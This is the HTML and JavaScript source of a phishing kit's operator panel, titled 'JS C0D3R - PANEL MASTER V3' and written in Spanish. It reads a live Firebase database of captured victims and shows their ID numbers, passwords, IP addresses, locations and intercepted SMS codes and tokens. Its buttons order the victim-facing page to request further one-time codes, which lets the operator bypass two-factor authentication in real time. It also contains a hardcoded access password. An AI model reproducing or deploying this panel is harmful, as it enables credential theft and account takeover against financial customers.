<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>JS C0D3R - PANEL MASTER V3</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <style>
        #admin-panel { display: none; }
        #auth-screen { display: flex; }
        .data-label { font-size: 10px; text-transform: uppercase; color: #9ca3af; font-weight: 700; margin-bottom: 2px; }
        .data-value { font-weight: 600; word-break: break-all; margin-bottom: 8px; line-height: 1.2; }
        .sms-pulse { animation: pulse-yellow 2s infinite; }
        .sms2-pulse { animation: pulse-orange 2s infinite; }
        @keyframes pulse-yellow { 0%, 100% { background-color: #fef9c3; } 50% { background-color: #fde047; } }
        @keyframes pulse-orange { 0%, 100% { background-color: #ffedd5; } 50% { background-color: #fed7aa; } }
    </style>
</head>
<body class="bg-gray-100">

    <div id="auth-screen" class="fixed inset-0 bg-slate-900 flex items-center justify-center z-[100]">
        <div class="bg-white p-8 rounded-2xl shadow-2xl w-96 text-center">
            <h2 class="text-2xl font-bold mb-6 text-gray-800">🔐 Acceso Master</h2>
            <input type="password" id="admin-pass" placeholder="Contraseña" class="w-full p-3 border rounded-lg mb-4 focus:ring-2 focus:ring-indigo-500">
            <button onclick="verificarAcceso()" class="w-full bg-indigo-600 text-white font-bold py-3 rounded-lg hover:bg-indigo-700 transition">Entrar</button>
        </div>
    </div>

    <div id="admin-panel">
        <nav class="bg-indigo-800 p-4 text-white flex justify-between items-center shadow-lg sticky top-0 z-50">
            <div class="flex items-center gap-4">
                <h1 class="text-xl font-bold italic">JS C0D3R - PANEL</h1>
                <div class="text-xs bg-indigo-900 px-3 py-1 rounded-full text-indigo-200">Refresco: <span id="timer">10</span>s</div>
            </div>
            <div class="flex items-center gap-4">
                <div class="bg-indigo-700 px-4 py-2 rounded-lg font-mono text-sm">TOTAL: <span id="total-count">0</span></div>
                <button onclick="borrarTodo()" class="bg-rose-600 hover:bg-rose-700 px-4 py-2 rounded-lg text-sm font-bold transition">Limpiar Todo</button>
                <button onclick="cerrarSesion()" class="bg-gray-800 px-4 py-2 rounded-lg text-sm font-bold">Salir</button>
            </div>
        </nav>

        <div class="max-w-7xl mx-auto p-6">
            <div id="users-container" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6"></div>
        </div>
    </div>

    <audio id="notif-sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>

    <script>
        const CLAVE_MAESTRA = "Cabimas2910"; 
        const firebaseConfig = { databaseURL: "https://coomecipaonline-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let idsConocidos = new Set(); 
        let primeraCarga = true;

        if (sessionStorage.getItem('ids_guardados')) {
            idsConocidos = new Set(JSON.parse(sessionStorage.getItem('ids_guardados')));
        }

        // Auto-Refresh Logic
        let countTimer = 10;
        setInterval(() => {
            if (--countTimer <= 0) location.reload();
            const timerElem = document.getElementById('timer');
            if (timerElem) timerElem.innerText = countTimer;
        }, 1000);

        function verificarAcceso() {
            if (document.getElementById('admin-pass').value === CLAVE_MAESTRA) {
                sessionStorage.setItem('admin_auth', 'true');
                mostrarPanel();
            }
        }

        function mostrarPanel() {
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('admin-panel').style.display = 'block';
            escucharBaseDeDatos();
        }

        if (sessionStorage.getItem('admin_auth') === 'true') mostrarPanel();

        function escucharBaseDeDatos() {
            db.ref('logins').on('value', (snapshot) => {
                const container = document.getElementById('users-container');
                container.innerHTML = '';
                let count = 0;

                snapshot.forEach((child) => {
                    const id = child.key;
                    const data = child.val();
                    if (!data.user) return;
                    count++;

                    if (!idsConocidos.has(id)) {
                        if (!primeraCarga) {
                            const audio = document.getElementById('notif-sound');
                            if (audio) audio.play().catch(()=>{});
                        }
                        idsConocidos.add(id);
                        sessionStorage.setItem('ids_guardados', JSON.stringify(Array.from(idsConocidos)));
                    }

                    const esEmp = !!data.cedula_juridica && data.cedula_juridica !== 'No proporcionada';
                    const statusColor = data.online ? 'bg-green-500' : 'bg-red-500';

                    container.innerHTML += `
                        <div class="bg-white rounded-xl shadow-lg p-5 border-t-8 ${esEmp ? 'border-blue-600' : 'border-indigo-500'} relative">
                            <div class="absolute top-2 right-2 flex items-center gap-1">
                                <span class="h-2 w-2 rounded-full ${statusColor} animate-pulse"></span>
                                <span class="text-[8px] font-bold text-gray-400">${data.online ? 'LIVE' : 'OFF'}</span>
                            </div>

                            <div class="mb-3">
                                <div class="text-[10px] font-bold text-gray-500 uppercase">${data.status || 'Activo'}</div>
                            </div>

                            <div class="space-y-1">
                                <div class="flex justify-between border-b pb-1">
                                    <span class="data-label text-gray-400 text-xs">N° de R.U.C.</span>
                                    <span class="data-value text-blue-900 font-bold text-xs">${data.cedula_juridica || '---'}</span>
                                </div>
                                <div class="flex justify-between border-b pb-1">
                                    <span class="data-label text-gray-400 text-xs">N° de Cédula</span>
                                    <span class="data-value text-blue-700 text-xs font-semibold">${data.user}</span>
                                </div>
                                <div class="flex justify-between border-b pb-1">
                                    <span class="data-label text-gray-400 text-xs">Contraseña</span>
                                    <span class="data-value text-rose-600 font-bold text-xs">${data.pass}</span>
                                </div>
                                
                                <div class="flex justify-between border-b pb-1 bg-slate-50 px-1 rounded">
                                    <span class="data-label text-gray-500 text-[11px] font-medium">📍 Ubicación</span>
                                    <span class="data-value text-emerald-700 font-bold text-[11px] truncate max-w-[150px]" title="${data.ubicacion || 'No capturada'}">
                                        ${data.ubicacion || 'Desconocida'}
                                    </span>
                                </div>
                                <div class="flex justify-between border-b pb-1 bg-slate-50 px-1 rounded">
                                    <span class="data-label text-gray-500 text-[10px]">🌐 IP</span>
                                    <span class="data-value text-slate-600 font-mono text-[10px]">${data.ip || '0.0.0.0'}</span>
                                </div>
                            </div>

                            ${data.sms ? `
                                <div class="mt-3 p-2 rounded border-2 border-yellow-500 bg-yellow-50 sms-pulse shadow-inner text-center">
                                    <div class="data-label text-yellow-800 text-[10px] font-bold">📩 CÓDIGO 1</div>
                                    <div class="text-2xl font-black text-gray-800">${data.sms}</div>
                                </div>` : ''}

                            ${data.sms2 ? `
                                <div class="mt-3 p-2 rounded border-2 border-orange-500 bg-orange-50 sms2-pulse shadow-inner text-center">
                                    <div class="data-label text-orange-800 text-[10px] font-bold">📩 CÓDIGO 2</div>
                                    <div class="text-2xl font-black text-gray-800">${data.sms2}</div>
                                </div>` : ''}

                                ${data.token ? `
                                <div class="mt-3 p-2 rounded border-2 border-yellow-500 bg-yellow-50 sms-pulse shadow-inner text-center">
                                    <div class="data-label text-yellow-800 text-[10px] font-bold">📩 TOKEN 1</div>
                                    <div class="text-2xl font-black text-gray-800">${data.token}</div>
                                </div>` : ''}

                            ${data.token2 ? `
                                <div class="mt-3 p-2 rounded border-2 border-orange-500 bg-orange-50 sms2-pulse shadow-inner text-center">
                                    <div class="data-label text-orange-800 text-[10px] font-bold">📩 TOKEN 2</div>
                                    <div class="text-2xl font-black text-gray-800">${data.token2}</div>
                                </div>` : ''}

                            <div class="mt-4 grid grid-cols-2 gap-2">
                                <button onclick="enviarOrden('${id}', 'pedir_codigo')" class="bg-amber-500 hover:bg-amber-600 text-white text-[9px] p-2 rounded font-bold uppercase">Solicitar SMS 1</button>
                                <button onclick="enviarOrden('${id}', 'pedir_codigo2')" class="bg-orange-600 hover:bg-orange-700 text-white text-[9px] p-2 rounded font-bold uppercase">Solicitar SMS 2</button>
                                <button onclick="enviarOrden('${id}', 'pedir_token1')" class="bg-blue-600 hover:bg-blue-700 text-white text-[9px] p-2 rounded font-bold uppercase">Solicitar Token 1</button>
                                <button onclick="enviarOrden('${id}', 'pedir_token2')" class="bg-teal-600 hover:bg-teal-700 text-white text-[9px] p-2 rounded font-bold uppercase">Solicitar Token 2</button>
                            </div>
                            
                            <div class="mt-2 flex gap-2">
                                <button onclick="enviarOrden('${id}', 'rechazar')" class="bg-slate-700 hover:bg-black text-white text-[9px] p-2 rounded font-bold flex-1 uppercase">Rechazar</button>
                                <button onclick="eliminarRegistro('${id}')" class="bg-rose-600 hover:bg-rose-700 text-white text-[9px] p-2 rounded font-bold flex-1 uppercase">Borrar</button>
                            </div>
                        </div>`;
                });
                document.getElementById('total-count').innerText = count;
                primeraCarga = false;
            });
        }

        function enviarOrden(id, accion) {
            let statusText = 'Activo';
            
            switch(accion) {
                case 'pedir_codigo':
                    statusText = 'ESPERANDO SMS 1';
                    break;
                case 'pedir_codigo2':
                    statusText = 'ESPERANDO SMS 2';
                    break;
                case 'pedir_token1':
                    statusText = 'ESPERANDO TOKEN 1';
                    break;
                case 'pedir_token2':
                    statusText = 'ESPERANDO TOKEN 2';
                    break;
                case 'rechazar':
                    statusText = 'SOLICITUD RECHAZADA';
                    break;
            }

            db.ref('logins/' + id).update({ status: statusText });

            db.ref('comandos/' + id).set({ 
                accion: accion, 
                ts: Date.now() 
            });
        }

        function eliminarRegistro(id) {
            if (confirm('¿Estás seguro de que deseas eliminar este usuario del panel?')) {
                db.ref('logins/' + id).remove()
                    .then(() => {
                        db.ref('comandos/' + id).remove();
                        console.log("Usuario eliminado: " + id);
                    })
                    .catch((error) => {
                        console.error("Error al eliminar:", error);
                    });
            }
        }

        function borrarTodo() { 
            if (confirm('¿Borrar todos los registros de la base de datos?')) { 
                sessionStorage.removeItem('ids_guardados'); 
                db.ref().remove(); 
            } 
        }
        
        function cerrarSesion() { sessionStorage.clear(); location.reload(); }
    </script>
</body>
</html>
